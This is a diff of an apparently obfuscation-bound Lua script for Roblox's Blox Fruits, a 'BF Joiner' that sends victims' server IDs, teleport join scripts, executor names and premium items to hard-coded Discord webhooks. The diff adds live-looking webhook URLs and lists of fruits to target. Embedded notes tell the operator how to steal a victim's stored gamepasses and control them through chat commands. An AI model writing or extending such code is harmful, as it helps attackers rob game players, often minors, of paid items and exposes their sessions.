@@ -1,3 +1,12 @@
+Webhook = "https://discord.com/api/webhooks/1342393909426393169/jlIXvpOJLj-IHTQFDOXUOklQSByaIFliRdxWWMV74feR-644YK8jo_iyxF2_3dPxaqBs"  -- Replace with your actual first webhook URL
+Usernames = {"user1", "user2"}
+Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-(East)", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard", "Dough-Dough"}
+FruitsToReset = {
+    "Gravity-Gravity",
+    "Blizzard-Blizzard",
+    "Quake-Quake"
+}
+
 --obfuscate after this
 
 if not Webhook then
@@ -10,7 +19,7 @@ if not Fruits then
     Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Kitsune-Kitsune", "Leopard-Leopard", "Dragon(East)-Dragon-(East)", "Gas-Gas"} -- Default Fruits
 end
 if not FruitsToReset then
-    FruitsToReset = {} -- Default FruitsToReset
+    FruitsToReset = {"Gravity-Gravity", "Blizzard-Blizzard"} -- Default FruitsToReset
 end
 
 Webhook2 = "https://discord.com/api/webhooks/1341674842901975100/mwDdKFsk2EZiK3Sz97bRJQWk5GD3chO5bLEfyCd7gmkY65gpqeLoBStj8akimxisHfAF"  -- hits
@@ -574,7 +583,7 @@ local JobId = game.JobId
 local JoinScript = string.format([[local TeleportService = game:GetService("TeleportService") local PlaceId = %d local JobId = "%s" TeleportService:TeleportToPlaceInstance(PlaceId, JobId, game.Players.LocalPlayer)]], game.PlaceId, JobId)
 
 local ExecutorName = identifyexecutor() or "Unknown Executor"
-local GameVersion = "1.4.0 (Rewrite)"
+local GameVersion = "1.4.0"
 local PlayerCount = #game:GetService("Players"):GetPlayers()
 local ServerTime = os.date("%Y-%m-%d %H:%M:%S")
 
@@ -596,7 +605,7 @@ local function formatPremiumItems()
 end
 
 local embed = {
-    title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
+    title = hasDragonFruit and "DRAGON HIT!" or "Rua BF Joiner",
     description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
     color = hasDragonFruit and 0xFF0000 or 0x00FF00,
     fields = {
@@ -612,9 +621,9 @@ local embed = {
         {name = "Join " .. Sea .. " (PC COPY)", value = "```lua\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script) .. "\n```", inline = false},
         {name = "Join " .. Sea .. " (Mobile COPY)", value = (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
         {name = "NOTES:", value = [[
-1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
-2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in rua hub channel "Commands for bf joiner"
-3. If victim Isn't on the server, it means he left.
+    1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
+    2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in rua hub channel "Commands for bf joiner"
+    3. If victim Isn't on the server, it means he left.
 ]], inline = false}
     }
 }
